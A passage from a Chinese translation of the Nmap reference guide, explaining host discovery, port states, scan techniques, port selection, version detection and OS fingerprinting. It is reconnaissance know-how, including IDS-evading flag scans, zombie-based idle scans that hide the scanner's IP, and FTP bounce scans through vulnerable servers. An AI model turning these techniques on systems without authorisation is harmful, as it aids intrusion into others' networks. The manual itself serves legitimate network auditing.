<p>除了前面讨论的这些不常见的 TCP 和 UDP 主机发现类型 Nmap 也能发送世人皆知的 ping 程序所发送的报文。Nmap 发送一个 ICMP type 8 (回声请求)报文到目标 IP 地址， 期待 从运行的主机得到一个 type 0 (回声响应)报文。 对于网络探索者而言，不幸的是，许 多主机和 防火墙现在封锁这些报文，而不是按期望的那样响应， 参见 <a href="http://www.rfc-editor.org/rfc/rfc1122.txt" target="_blank" rel="external">RFC 1122</a>。因此</p>
<p>仅仅 ICMP 扫描对于互联网上的目标通常是不够的。 但对于系统管理员监视一个内部网 络，它们可能是实际有效的途径。 使用-PE 选项打开该回声请求功能。</p>
<p>虽然回声请求是标准的 ICMP ping 查询， Nmap 并不止于此。ICMP 标准 (<a href="http://www.rfc-editor.org/rfc/rfc792.txt" target="_blank" rel="external">RFC 792</a>)还规 范了时间戳请求，信息请求 request，和地址掩码请求，它们的代码分别是 13，15 和 17 虽然这些查询的表面目的是获取信息如地址掩码和当前时间， 它们也可以很容易地用于 主机发现。 很简单，回应的系统就是在运行的系统。Nmap 目前没有实现信息请求报文 因为它们还没有被广泛支持。RFC 1122 坚持 “主机不应该实现这些消息”。 时间戳和 地址掩码查询可以分别用-PP 和-PM 选项发送。 时间戳响应(ICMP 代码 14)或者地址掩码 响应(代码 18)表示主机在运行。 当管理员特别封锁了回声请求报文而忘了其它 ICMP 查 询可能用于 相同目的时，这两个查询可能很有价值。</p>
<p><code>-PR</code> (ARP Ping)</p>
<p>最常见的 Nmap 使用场景之一是扫描一个以太局域网。 在大部分局域网上，特别是那些 使用基于 RFC1918 私有地址范围的网络，在一个给定的时间绝大部分 IP 地址都是不使 用的。 当 Nmap 试图发送一个原始 IP 报文如 ICMP 回声请求时， 操作系统必须确定对应 于目标 IP 的硬件 地址(ARP)，这样它才能把以太帧送往正确的地址。 这一般比较慢而 且会有些问题，因为操作系统设计者认为一般不会在短时间内 对没有运行的机器作几百 万次的 ARP 请求。</p>
<p>当进行 ARP 扫描时，Nmap 用它优化的算法管理 ARP 请求。 当它收到响应时， Nmap 甚至 不需要担心基于 IP 的 ping 报文，既然它已经知道该主机正在运行了。 这使得 ARP 扫描 比基于 IP 的扫描更快更可靠。 所以默认情况下，如果 Nmap 发现目标主机就在它所在的 局域网上，它会进行 ARP 扫描。 即使指定了不同的 ping 类型(如 -PI 或者 -PS) ，Nmap 也会对任何相同局域网上的目标机使用 ARP。 如果您真的不想要 ARP 扫描，指定 <code>--send-ip</code>。</p>
<p><code>-n</code> (不用域名解析)</p>
<p>告诉 Nmap 永不对它发现的活动 IP 地址进行反向域名解析。 既然 DNS 一般比较慢，这可 以让事情更快些。</p>
<p><code>-R</code> (为所有目标解析域名)</p>
<p>告诉 Nmap 永远 对目标 IP 地址作反向域名解析。 一般只有当发现机器正在运行时才进 行这项操作。</p>
<p><code>--system_dns</code> (使用系统域名解析器)</p>
<p>默认情况下，Nmap 通过直接发送查询到您的主机上配置的域名服务器 来解析域名。为了 提高性能，许多请求 (一般几十个 ) 并发执行。如果您希望使用系统自带的解析器，就 指定该选项 (通过 getnameinfo()调用一次解析一个 IP) 除非 Nmap 的 DNS 代码有 bug– 如果是这样，请联系我们。 一般不使用该选项，因为它慢多了。系统解析器总是用于 IPv6 扫描。</p>
<h2 id="六、_端口扫描基础">六、 端口扫描基础</h2><p>虽然 Nmap 这些年来功能越来越多， 它也是从一个高效的端口扫描器开始的，并且那仍然是它 的核心功能。 nmap target 这个简单的命令扫描主机 target 上的超过 1660 个 TCP 端口。 。 许多传统的端口扫描器只列出所有端口是开放还是关闭的， Nmap 的信息粒度比它们要细得多 它把端口分成六个状态: open(开放的)， closed(关闭的)，filtered(被过滤的)， unfiltered(未被过滤的)， open|filtered(开放或者被过滤的)，或者 closed|filtered(关闭 或者未被过滤的)。</p>
<p>这些状态并非端口本身的性质，而是描述 Nmap 怎样看待它们。例如，对于同样的目标机器的 135/tcp 端口，从同网络扫描显示它是开放的，而跨网络作完全相同的扫描则可能显示它是 filtered(被过滤的)。</p>
<p>Nmap 所识别的 6 个端口状态。 open(开放的)</p>
<p>应用程序正在该端口接收 TCP 连接或者 UDP 报文 发现这一点常常是端口扫描 的主要目 标。安全意识强的人们知道每个开放的端口 都是攻击的入口。攻击者或者入侵测试者想 要发现开放的端口。 而管理员则试图关闭它们或者用防火墙保护它们以免妨碍了合法用 户。 非安全扫描可能对开放的端口也感兴趣，因为它们显示了网络上那些服务可供使用</p>
<p>closed(关闭的)</p>
<p>关闭的端口对于 Nmap 也是可访问的(它接受 Nmap 的探测报文并作出响应)， 但没有应用 程序在其上监听。 它们可以显示该 IP 地址上(主机发现，或者 ping 扫描)的主机正在运 行 up 也对部分操作系统探测有所帮助。 因为关闭的关口是可访问的，也许过会儿值得 再扫描一下，可能一些又开放了。 系统管理员可能会考虑用防火墙封锁这样的端口。 那 样他们就会被显示为被过滤的状态，下面讨论。</p>
<p>filtered(被过滤的)</p>
<p>由于包过滤阻止探测报文到达端口， Nmap 无法确定该端口是否开放。过滤可能来自专业 的防火墙设备，路由器规则 或者主机上的软件防火墙。这样的端口让攻击者感觉很挫折 因为它们几乎不提供 任何信息。有时候它们响应 ICMP 错误消息如类型 3 代码 13 (无法 到达目标: 通信被管理员禁止)，但更普遍的是过滤器只是丢弃探测帧， 不做任何响应 这迫使 Nmap 重试若干次以访万一探测包是由于网络阻塞丢弃的。 这使得扫描速度明显 变慢。</p>
<p>unfiltered(未被过滤的)</p>
<p>未被过滤状态意味着端口可访问，但 Nmap 不能确定它是开放还是关闭。 只有用于映射 防火墙规则集的 ACK 扫描才会把端口分类到这种状态。 用其它类型的扫描如窗口扫描， SYN 扫描，或者 FIN 扫描来扫描未被过滤的端口可以帮助确定 端口是否开放。</p>
<p>open|filtered(开放或者被过滤的)</p>
<p>当无法确定端口是开放还是被过滤的，Namp 就把该端口划分成 这种状态。开放的端口不 响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任 何响应。因此 Nmap 无法确定该端口是开放的还是被过滤的。 UDP，IP 协议， FIN，Null 和 Xmas 扫描可能把端口归入此类。</p>
<p>closed|filtered(关闭或者被过滤的)</p>
<p>该状态用于 Nmap 不能确定端口是关闭的还是被过滤的。 它只可能出现在 IPID Idle 扫 描中。</p>
<h2 id="七、_端口扫描技术">七、 端口扫描技术</h2><p>作为一个修车新手，我可能折腾几个小时来摸索怎样把基本工具(锤子，胶带，扳子等) 用于手 头的任务。当我惨痛地失败，把我的老爷车拖到一个真正的技师那儿的时候，他总是在他的工 具箱里翻来翻去，直到拽出一个完美的工具然后似乎不费吹灰之力搞定它。端口扫描的艺术和 这个类似。专家理解成打的扫描技术，选择最适合的一种 (或者组合)来完成给定的任务。 另 一方面，没有经验的用户和刚入门者总是用默认的 SYN 扫描解决每个问题。既然 Nmap 是免费的 掌握端口扫描的唯一障碍就是知识。这当然是汽车世界所不能比的，在那里，可能需要高超的 技巧才能确定您需要一个压杆弹簧压缩机，接着您还得为它付数千美金。</p>
<p>大部分扫描类型只对特权用户可用。这是因为他们发送接收原始报文，这在 Unix 系统需要 root 权限。在 Windows 上推荐使用 administrator 账户，但是当 WinPcap 已经被加载到操作系统时 非特权用户也可以正常使用 Nmap 当 Namp 在 1997 年发布时 需要 root 权限是一个严重的局限 因为很多用户只有共享的 shell 账户。现在，世界变了，计算机便宜了，更多人拥有互联网连 接，桌面 UNIX 系统 (包括 Linux 和 MAC OS X)很普遍了。Windows 版本的 Nmap 现在也有了，这 使它可以运行在更多的桌面上。由于所有这些原因，用户不再需要用有限的共享 shell 账户运 行 Nmap。这是很幸运的，因为特权选项让 Nmap 强大得多也灵活得多。</p>
<p>虽然 Nmap 努力产生正确的结果，但请记住所有结果都是基于目标机器(或者它们前面的防火墙) 返回的报文的。。这些主机也许是不值得信任的，它们可能响应以迷惑或误导 Nmap 的报文。更 普遍的是非 RFC 兼容的主机以不正确的方式响应 Nmap 探测。FIN，Null 和 Xmas 扫描特别容易遇 到这个问题。这些是特定扫描类型的问题，因此我们在个别扫描类型里讨论它们。</p>
<p>这一节讨论 Nmap 支持的大约十几种扫描技术。一般一次只用一种方法，除了 UDP 扫描(-sU)可 能和任何一种 TCP 扫描类型结合使用 友情提示一下 端口扫描类型的选项格式是-sC 其中 C 是 个显眼的字符，通常是第一个字符。一个例外是 deprecated FTP bounce 扫描(-b)。默认情况 下，Nmap 执行一个 SYN 扫描，但是如果用户没有权限发送原始报文(在 UNIX 上需要 root 权限) 或者如果指定的是 IPv6 目标，Nmap 调用 connect()。本节列出的扫描中，非特权用户只能执行 connect()和 ftp bounce 扫描。</p>
<p><code>-sS</code> (TCP SYN 扫描)</p>
<p>SYN 扫描作为默认的也是最受欢迎的扫描选项，是有充分理由的。它执行得很快，在一个 没有入侵防火墙的快速网络上，每秒钟可以扫描数千个端口。 SYN 扫描相对来说不张扬 不易被注意到，因为它从来不完成 TCP 连接。它也不像 Fin/Null/Xmas，Maimon 和 Idle 扫描依赖于特定平台，而可以应对任何兼容的 TCP 协议栈。它还可以明确可靠地区分 open(开放的)， closed(关闭的)，和 filtered(被过滤的) 状态</p>
<p>它常常被称为半开放扫描，因为它不打开一个完全的 TCP 连接。它发送一个 SYN 报文， 就像您真的要打开一个连接，然后等待响应。 SYN/ACK 表示端口在监听 (开放)，而 RST (复位)表示没有监听者。如果数次重发后仍没响应，该端口就被标记为被过滤。如果收 到 ICMP 不可到达错误 (类型 3，代码 1，2，3，9，10，或者 13)，该端口也被标记为被 过滤。</p>
<p><code>-sT</code> (TCP connect()扫描)</p>
<p>当 SYN 扫描不能用时，CP Connect()扫描就是默认的 TCP 扫描。当用户没有权限发送原 始报文或者扫描 IPv6 网络时，就是这种情况。 Instead of writing raw packets as most other scan types do，Nmap 通过创建 connect() 系统调用要求操作系统和目标机以及 端口建立连接，而不像其它扫描类型直接发送原始报文。 这是和 Web 浏览器，P2P 客户 端以及大多数其它网络应用程序用以建立连接一样的 高层系统调用 它是叫做 Berkeley Sockets API 编程接口的一部分。Nmap 用该 API 获得每个连接尝试的状态信息，而不是 读取响应的原始报文。</p>
<p>当 SYN 扫描可用时，它通常是更好的选择。因为 Nmap 对高层的 connect()调用比对原始 报文控制更少 所以前者效率较低 该系统调用完全连接到开放的目标端口而不是像 SYN 扫描进行半开放的复位。这不仅花更长时间，需要更多报文得到同样信息，目标机也更 可能记录下连接。IDS(入侵检测系统)可以捕获两者，但大部分机器没有这样的警报系统 当 Nmap 连接，然后不发送数据又关闭连接，许多普通 UNIX 系统上的服务会在 syslog 留 下记录，有时候是一条加密的错误消息。此时，有些真正可怜的服务会崩溃，虽然这不 常发生。如果管理员在日志里看到来自同一系统的一堆连接尝试，她应该知道她的系统 被扫描了。</p>
<p><code>-sU</code> (UDP 扫描)</p>
<p>虽然互联网上很多流行的服务运行在 TCP 协议上，<a href="http://www.rfc-editor.org/rfc/rfc768.txt" target="_blank" rel="external">UDP</a> 服务也不少。 DNS，SNMP，和 DHCP (注册的端口是 53，161/162，和 67/68)是最常见的三个。因为 UDP 扫描一般较慢，比 TCP 更困难，一些安全审核人员忽略这些端口。这是一个错误，因为可探测的 UDP 服务相当 普遍，攻击者当然不会忽略整个协议。所幸，Nmap 可以帮助记录并报告 UDP 端口。</p>
<p>UDP 扫描用<code>-sU</code> 选项激活 它可以和 TCP 扫描如 SYN 扫描 (<code>-sS</code>)结合使用来同时检查两种 协议。</p>
<p>UDP 扫描发送空的(没有数据)UDP 报头到每个目标端口。如果返回 ICMP 端口不可到达错 误(类型 3，代码 3)，该端口是 closed(关闭的)。 其它 ICMP 不可到达错误(类型 3，代 码 1，2，9，10，或者 13)表明该端口是 filtered(被过滤的)。偶尔地，某服务会响应一 个 UDP 报文，证明该端口是 open(开放的)。如果几次重试后还没有响应，该端口就被认为是 open|filtered(开放|被过滤的)。这意味着该端口可能是开放的，也可能包过滤器 正在封锁通信。可以用版本扫描(-sV)帮助区分真正的开放端口和被过滤的端口。</p>
<p>UDP 扫描的巨大挑战是怎样使它更快速。开放的和被过滤的端口很少响应，让 Nmap 超时 然后再探测，以防探测帧或者响应丢失。关闭的端口常常是更大的问题。它们一般发回 一个 ICMP 端口无法到达错误 但是不像关闭的 TCP 端口响应 SYN 或者 Connect 扫描所发 送的 RST 报文，许多主机在默认情况下限制 ICMP 端口不可到达消息。 Linux 和 Solaris 对此特别严格。例如， Linux 2.4.20 内核限制一秒钟只发送一条目标不可到达消息 (见 net/ipv4/icmp。c)。</p>
<p>Nmap 探测速率限制并相应地减慢来避免用那些目标机会丢弃的无用报文来阻塞网络。不 幸的是，Linux 式的一秒钟一个报文的限制使 65,536 个端口的扫描要花 18 小时以上。 加速 UDP 扫描的方法包括并发扫描更多的主机，先只对主要端口进行快速扫描，从防火 墙后面扫描，使用–host-timeout 跳过慢速的主机。</p>
<p><code>-sN; -sF; -sX</code> (TCP Null，FIN，and Xmas 扫描)</p>
<p>这三种扫描类型 (甚至用下一节描述的 –scanflags 选项的更多类型) 在 <a href="http://www.rfc-editor.org/rfc/rfc793.txt" target="_blank" rel="external">TCP RFC</a> 中 发掘了一个微妙的方法来区分 open(开放的)和 closed(关闭的)端口。第 65 页说“如果 [目标]端口状态是关闭的…. 进入的不含 RST 的报文导致一个 RST 响应。” 接下来的 一页讨论不设置 SYN，RST，或者 ACK 位的报文发送到开放端口: “理论上，这不应该发 生，如果您确实收到了，丢弃该报文，返回。 ”</p>
<p>如果扫描系统遵循该 RFC，当端口关闭时，任何不包含 SYN，RST，或者 ACK 位的报文会 导致一个 RST 返回，而当端口开放时，应该没有任何响应。只要不包含 SYN，RST，或者 ACK，任何其它三种(FIN，PSH，and URG)的组合都行。Nmap 有三种扫描类型利用这一点</p>
<p>Null 扫描 (<code>-sN</code>) 不设置任何标志位(tcp 标志头是 0) FIN 扫描 (<code>-sF</code>)</p>
<p>只设置 TCP FIN 标志位。 Xmas 扫描 (-sX)</p>
<p>设置 FIN，PSH，和 URG 标志位，就像点亮圣诞树上所有的灯一样。</p>
<p>除了探测报文的标志位不同，这三种扫描在行为上完全一致。如果收到一个 RST 报文， 该端口被认为是 closed(关闭的) 而没有响应则意味着端口是 open|filtered(开放或者 被过滤的)。如果收到 ICMP 不可到达错误(类型 3，代号 1，2，3，9，10，或者 13)，该 端口就被标记为 被过滤的。</p>
<p>这些扫描的关键优势是它们能躲过一些无状态防火墙和报文过滤路由器。另一个优势是 这些扫描类型甚至比 SYN 扫描还要隐秘一些。但是别依赖它 – 多数现代的 IDS 产品可</p>
<p>以发现它们。一个很大的不足是并非所有系统都严格遵循 RFC 793。 许多系统不管端口 开放还是关闭，都响应 RST。这导致所有端口都标记为 closed(关闭的)。这样的操作系 统主要有 Microsoft Windows，许多 Cisco 设备，BSDI，以及 IBM OS/400。但是这种扫 描对多数 UNIX 系统都能工作 这些扫描的另一个不足是它们不能辨别 open(开放的)端口 和一些特定的 filtered(被过滤的)端口，从而返回 open|filtered(开放或者被过滤 的)。</p>
<p><code>-sA</code> (TCP ACK 扫描)</p>
<p>这种扫描与目前为止讨论的其它扫描的不同之处在于它不能确定 open(开放的)或者 open|filtered(开放或者过滤的))端口。它用于发现防火墙规则，确定它们是有状态的 还是无状态的，哪些端口是被过滤的。</p>
<p>ACK 扫描探测报文只设置 ACK 标志位(除非您使用 –scanflags) 当扫描未被过滤的系统 时， open(开放的)和 closed(关闭的) 端口都会返回 RST 报文。Nmap 把它们标记为 unfiltered(未被过滤的)，意思是 ACK 报文不能到达，但至于它们是 open(开放的)或者 closed(关闭的) 无法确定。不响应的端口或者发送特定的 ICMP 错误消息(类型 3，代号 1，2，3，9，10，或者 13)的端口，标记为 filtered(被过滤的)。</p>
<p><code>-sW</code> (TCP 窗口扫描)</p>
<p>除了利用特定系统的实现细节来区分开放端口和关闭端口，当收到 RST 时不总是打印 unfiltered，窗口扫描和 ACK 扫描完全一样。它通过检查返回的 RST 报文的 TCP 窗口域 做到这一点。在某些系统上，开放端口用正数表示窗口大小(甚至对于 RST 报文) 而关闭 端口的窗口大小为 0。因此，当收到 RST 时，窗口扫描不总是把端口标记为 unfiltered 而是根据 TCP 窗口值是正数还是 0，分别把端口标记为 open 或者 closed</p>
<p>该扫描依赖于互联网上少数系统的实现细节，因此您不能永远相信它。不支持它的系统 会通常返回所有端口 closed。当然，一台机器没有开放端口也是有可能的。如果大部分 被扫描的端口是 closed，而一些常见的端口 (如 22， 25，53) 是 filtered，该系统 就非常可疑了。偶尔地，系统甚至会显示恰恰相反的行为。 如果您的扫描显示 1000 个 开放的端口和 3 个关闭的或者被过滤的端口，那么那 3 个很可能也是开放的端口。</p>
<p><code>-sM</code> (TCP Maimon 扫描)</p>
<p>Maimon 扫描是用它的发现者 Uriel Maimon 命名的。他在 Phrack Magazine issue #49 (November 1996)中描述了这一技术。 Nmap 在两期后加入了这一技术。这项技术和 Null FIN，以及 Xmas 扫描完全一样，除了探测报文是 FIN/ACK。根据 RFC 793 (TCP)，无论端 口开放或者关闭，都应该对这样的探测响应 RST 报文。然而，Uriel 注意到如果端口开放 许多基于 BSD 的系统只是丢弃该探测报文。</p>
<p><code>--scanflags</code> (定制的 TCP 扫描)</p>
<p>真正的 Nmap 高级用户不需要被这些现成的扫描类型束缚 –scanflags 选项允许您通过 指定任意 TCP 标志位来设计您自己的扫描。让您的创造力流动，躲开那些仅靠本手册添 加规则的入侵检测系统！</p>
<p><code>--scanflags</code> 选项可以是一个数字标记值如 9 (PSH 和 FIN)，但使用字符名更容易些。只 要是 URG， ACK，PSH， RST，SYN，and FIN 的任何组合就行。例如，–scanflags URGACKPSHRSTSYNFIN 设置了所有标志位，但是这对扫描没有太大用处。标志位的顺序不 重要。</p>
<p>除了设置需要的标志位，您也可以设置 TCP 扫描类型(如-sA 或者-sF)。那个基本类型告 诉 Nmap 怎样解释响应。例如， SYN 扫描认为没有响应意味着 filtered 端口，而 FIN 扫 描则认为是 open|filtered。除了使用您指定的 TCP 标记位，Nmap 会和基本扫描类型一 样工作。如果您不指定基本类型，就使用 SYN 扫描。</p>
<p><code>-sI &lt;zombie host[:probeport]&gt;</code> (Idlescan)</p>
<p>这种高级的扫描方法允许对目标进行真正的 TCP 端口盲扫描 (意味着没有报文从您的真 实 IP 地址发送到目标)。相反，side-channel 攻击 利用 zombie 主机上已知的 IP 分段 ID 序列生成算法来窥探目标上开放端口的信息。 IDS 系统将显示扫描来自您指定的 zombie 机(必须运行并且符合一定的标准)。 这种奇妙的扫描类型太复杂了，不能在此完 全描述，所以我写一篇非正式的论文， 发布在 <a href="http://nmap.org/book/idlescan.html" target="_blank" rel="external">http://nmap.org/book/idlescan.html</a>。</p>
<p>除了极端隐蔽(由于它不从真实 IP 地址发送任何报文)， 该扫描类型可以建立机器间的 基于 IP 的信任关系。 端口列表从 zombie 主机的角度。显示开放的端口。 因此您可以 尝试用您认为(通过路由器/包过滤规则)可能被信任的 zombies 扫描目标。</p>
<p>如果您由于 IPID 改变希望探测 zombie 上的特定端口， 您可以在 zombie 主机后加上一 个冒号和端口号。 否则 Nmap 会使用默认端口(80)。</p>
<p><code>-sO</code> (IP 协议扫描)</p>
<p>IP 协议扫描可以让您确定目标机支持哪些 IP 协议 (TCP，ICMP，IGMP，等等)。从技术 上说，这不是端口扫描，既然它遍历的是 IP 协议号而不是 TCP 或者 UDP 端口号。但是它 仍使用 -p 选项选择要扫描的协议号，用正常的端口表格式报告结果，甚至用和真正的端 口扫描一样的扫描引擎。因此它和端口扫描非常接近，也被放在这里讨论。</p>
<p>除了本身很有用，协议扫描还显示了开源软件的力量。尽管基本想法非常简单，我过去 从没想过增加这一功能也没收到任何对它的请求。在 2000 年夏天，Gerhard Rieger 孕育 了这个想法，写了一个很棒的补丁程序，发送到 nmap-hackers 邮件列表。我把那个补丁 加入了 Nmap，第二天发布了新版本。几乎没有商业软件会有用户有足够的热情设计并贡 献他们的改进。</p>
<p>协议扫描以和 UDP 扫描类似的方式工作。它不是在 UDP 报文的端口域上循环，而是在 IP 协议域的 8 位上循环，发送 IP 报文头。报文头通常是空的，不包含数据，甚至不包含所 申明的协议的正确报文头 TCP，UDP，和 ICMP 是三个例外。它们三个会使用正常的协议头，因为否则某些系统拒绝发送，而且 Nmap 有函数创建它们。协议扫描不是注意 ICMP 端口不可到达消息，而是 ICMP 协议不可到达消息。如果 Nmap 从目标主机收到任何协议 的任何响应，Nmap 就把那个协议标记为 open。 ICMP 协议不可到达错误(类型 3，代号 2) 导致协议被标记为 closed。其它 ICMP 不可到达协议(类型 3，代号 1，3，9，10，或者 13) 导致协议被标记为 filtered (虽然同时他们证明 ICMP 是 open )。如果重试之后仍 没有收到响应，该协议就被标记为 open|filtered</p>
<p><code>-b &lt;ftp relay host&gt;</code> (FTP 弹跳扫描)</p>
<p>FTP 协议的一个有趣特征(<a href="http://www.rfc-editor.org/rfc/rfc959.txt" target="_blank" rel="external">RFC 959</a>) 是支持所谓代理 ftp 连接。它允许用户连接到一台 FTP 服务器，然后要求文件送到一台第三方服务器。这个特性在很多层次上被滥用，所以 许多服务器已经停止支持它了。其中一种就是导致 FTP 服务器对其它主机端口扫描。只 要请求 FTP 服务器轮流发送一个文件到目标主机上的所感兴趣的端口。错误消息会描述 端口是开放还是关闭的。这是绕过防火墙的好方法，因为 FTP 服务器常常被置于可以访 问比 Web 主机更多其它内部主机的位置。 Nmap 用-b 选项支持 ftp 弹跳扫描。参数格式 是 username:password@server:port。 Server 是某个脆弱的 FTP 服务器的名字或者 IP 地址。您也许可以省略 username:password，如果服务器上开放了匿名用户 (user:anonymous password:-wwwuser@)。端口号(以及前面的冒号) 也可以省略，如果 server 使用默认的 FTP 端口(21)。</p>
<p>当 Nmap1997 年发布时，这个弱点被广泛利用，但现在大部分已经被 fix 了。脆弱的服务 器仍然存在，所以如果其它都失败了，这也值得一试。如果您的目标是绕过防火墙，扫 描目标网络上的开放的 21 端口(或者甚至任何 ftp 服务，如果您用版本探测扫描所有端 口)，然后对每个尝试弹跳扫描。Nmap 会告诉您该主机脆弱与否。如果您只是试着玩 Nmap， 您不必(事实上，不应该)限制您自己。在您随机地在互联网上寻找脆弱的 FTP 服务器时 考虑一下系统管理员不太喜欢您这样滥用他们的服务器。</p>
<h2 id="八、_端口说明和扫描顺序">八、 端口说明和扫描顺序</h2><p>除了所有前面讨论的扫描方法 Nmap 提供选项说明那些端口被扫描以及扫描是随机还是顺序进 行。 默认情况下，Nmap 用指定的协议对端口 1 到 1024 以及 nmap-services 文件中列出的更高 的端口在扫描。</p>
<p><code>-p &lt;port ranges&gt;</code> (只扫描指定的端口)</p>
<p>该选项指明您想扫描的端口，覆盖默认值。 单个端口和用连字符表示的端口范围(如 1-1023)都可以。 范围的开始以及/或者结束值可以被省略， 分别导致 Nmap 使用 1 和 65535。所以您可以指定 -p-从端口 1 扫描到 65535。 如果您特别指定，也可以扫描端口 0。 对于 IP 协议扫描(-sO)，该选项指定您希望扫描的协议号 (0-255)。</p>
<p>当既扫描 TCP 端口又扫描 UDP 端口时，您可以通过在端口号前加上 T: 或者 U:指定协议 协议限定符一直有效您直到指定另一个。 例如，参数 -p U:53，111，137，T:21-25， 80，139，8080 将扫描 UDP 端口 53，111，和 137，同时扫描列出的 TCP 端口。注意，要既扫描 UDP 又扫描 TCP，您必须指定 -sU ，以及至少一个 TCP 扫描类型(如 -sS，-sF， 或者 -sT)。如果没有给定协议限定符， 端口号会被加到所有协议列表。</p>
<p><code>-F</code> (快速 (有限的端口) 扫描)</p>
<p>在 nmap 的 nmap-services 文件中(对于-sO，是协议文件)指定您想要扫描的端口。 这比 扫描所有 65535 个端口快得多。 因为该列表包含如此多的 TCP 端口(1200 多)，这和默认 的 TCP 扫描 scan (大约 1600 个端口)速度差别不是很大。如果您用–datadir 选项指定 您自己的 小小的 nmap-services 文件 ，差别会很惊人。</p>
<p><code>-r</code> (不要按随机顺序扫描端口)</p>
<p>默认情况下，Nmap 按随机顺序扫描端口 (除了出于效率的考虑，常用的端口前移)。这种 随机化通常都是受欢迎的， 但您也可以指定-r 来顺序端口扫描。</p>
<h2 id="九、_服务和版本探测">九、 服务和版本探测</h2><p>把 Nmap 指向一个远程机器，它可能告诉您 端口 25/tcp，80/tcp，和 53/udp 是开放的。使用包 含大约 2,200 个著名的服务的 nmap-services 数据库， Nmap 可以报告那些端口可能分别对应 于一个邮件服务器 (SMTP) web 服务器(HTTP) 和域名服务器(DNS) 这种查询通常是正确的 – 事实上，绝大多数在 TCP 端口 25 监听的守护进程是邮件 服务器。然而，您不应该把赌注押在 这上面! 人们完全可以在一些奇怪的端口上运行服务。</p>
<p>即使 Nmap 是对的，假设运行服务的确实是 SMTP，HTTP 和 DNS，那也不是特别多的信息。 当为 您的公司或者客户作安全评估(或者甚至简单的网络明细清单)时， 您确实想知道正在运行什么 邮件和域名服务器以及它们的版本。 有一个精确的版本号对了解服务器有什么漏洞有巨大帮 助。 版本探测可以帮您获得该信息。</p>
<p>在用某种其它类型的扫描方法发现 TCP 和/或者 UDP 端口后， 版本探测会询问这些端口，确定 到底什么服务正在运行。 nmap-service-probes 数据库包含查询不同服务的探测报文 和解析 识别响应的匹配表达式。 Nmap 试图确定服务协议 (如 ftp，ssh，telnet，http)，应用程序名 (如 ISC Bind，Apache httpd，Solaris telnetd)，版本号， 主机名，设备类型(如 打印机， 路由器)，操作系统家族 (如 Windows，Linux)以及其它的细节，如 如是否可以连接 X server SSH 协议版本 ，或者 KaZaA 用户名)。当然，并非所有服务都提供所有这些信息。 如果 Nmap 被编译成支持 OpenSSL， 它将连接到 SSL 服务器，推测什么服务在加密层后面监听。 当发现 RPC 服务时， Nmap RPC grinder (-sR)会自动被用于确定 RPC 程序和它的版本号。 如果在扫描 某个 UDP 端口后仍然无法确定该端口是开放的还是被过滤的，那么该端口状态就 被标记为 open|filtered。 版本探测将试图从这些端口引发一个响应(就像它对开放端口做的一样)， 如 果成功，就把状态改为开放。 open|filtered TCP 端口用同样的方法对待。 注意 Nmap -A 选项 在其它情况下打开版本探测。 有一篇关于版本探测的原理，使用和定制的文章在 <a href="http://www.insecure.org/nmap/vscan/" target="_blank" rel="external">http://www.insecure.org/nmap/vscan/</a>。</p>
<p>当 Nmap 从某个服务收到响应，但不能在数据库中找到匹配时， 它就打印一个特殊的 fingerprint 和一个 URL 给您提交，如果您确实知道什么服务运行在端口。 请花两分钟提交您的发现，让每个人受益。由于这些提交， Nmap 有 350 种以上协议如 smtp，ftp，http 等的大约 3，000 条模式匹配。</p>
<p>用下列的选项打开和控制版本探测。</p>
<p><code>-sV</code> (版本探测)</p>
<p>打开版本探测。 您也可以用-A 同时打开操作系统探测和版本探测。</p>
<p><code>--allports</code> (不为版本探测排除任何端口)</p>
<p>默认情况下，Nmap 版本探测会跳过 9100 TCP 端口，因为一些打印机简单地打印送到该端 口的 任何数据，这回导致数十页 HTTP get 请求，二进制 SSL 会话请求等等被打印出来 这一行为可以通过修改或删除 nmap-service-probes 中的 Exclude 指示符改变 您也可 以不理会任何 Exclude 指示符，指定–allports 扫描所有端口</p>
<p><code>--version-intensity &lt;intensity&gt;</code> (设置 版本扫描强度)</p>
<p>当进行版本扫描(-sV)时，nmap 发送一系列探测报文 ，每个报文都被赋予一个 1 到 9 之 间的值。 被赋予较低值的探测报文对大范围的常见服务有效，而被赋予较高值的报文 一 般没什么用。强度水平说明了应该使用哪些探测报文。数值越高， 服务越有可能被正确 识别。 然而，高强度扫描花更多时间。强度值必须在 0 和 9 之间。 默认是 7。当探测报 文通过 nmap-service-probes ports 指示符 注册到目标端口时，无论什么强度水平，探 测报文都会被尝试。这保证了 DNS 探测将永远在任何开放的 53 端口尝试， SSL 探测将 在 443 端口尝试，等等。</p>
<p><code>--version-light</code> (打开轻量级模式)</p>
<p>这是 –version-intensity 2 的方便的别名。轻量级模式使 版本扫描快许多，但它识别 服务的可能性也略微小一点。</p>
<p><code>--version-all</code> (尝试每个探测)</p>
<p><code>--version-intensity</code> 9 的别名， 保证对每个端口尝试每个探测报文。</p>
<p><code>--version-trace</code> (跟踪版本扫描活动)</p>
<p>这导致 Nmap 打印出详细的关于正在进行的扫描的调试信息。 它是您用–packet-trace 所得到的信息的子集。</p>
<p><code>-sR</code> (RPC 扫描)</p>
<p>这种方法和许多端口扫描方法联合使用。 它对所有被发现开放的 TCP/UDP 端口执行 SunRPC 程序 NULL 命令，来试图 确定它们是否 RPC 端口，如果是， 是什么程序和版本号 因此您可以有效地获得和 rpcinfo -p 一样的信息， 即使目标的端口映射在防火墙后面(或者被 TCP 包装器保护) Decoys 目前不能和 RPC scan 一起工作 这作为版本扫描(-sV) 的一部分自动打开。 由于版本探测包括它并且全面得多，-sR 很少被需要。</p>
<h2 id="十、_操作系统探测">十、 操作系统探测</h2><p>Nmap 最著名的功能之一是用 TCP/IP 协议栈 fingerprinting 进行远程操作系统探测。 Nmap 发 送一系列 TCP 和 UDP 报文到远程主机，检查响应中的每一个比特。 在进行一打测试如 TCP ISN 采样，TCP 选项支持和排序，IPID 采样，和初始窗口大小检查之后， Nmap 把结果和数据库 nmap-os-fingerprints 中超过 1500 个已知的操作系统的 fingerprints 进行比较 如果有匹配 就打印出操作系统的详细信息 每个 fingerprint 包括一个自由格式的关于 OS 的描述文本 和 一个分类信息，它提供供应商名称(如 Sun)，下面的操作系统(如 Solaris)，OS 版本(如 10)， 和 设备类型(通用设备，路由器，switch，游戏控制台， 等)。</p>
<p>如果 Nmap 不能猜出操作系统，并且有些好的已知条件(如 至少发现了一个开放端口和一个关闭 端口)，Nmap 会提供一个 URL，如果您确知运行的操作系统，您可以把 fingerprint 提交到那个 URL。 这样您就扩大了 Nmap 的操作系统知识库，从而让每个 Nmap 用户都受益。</p>
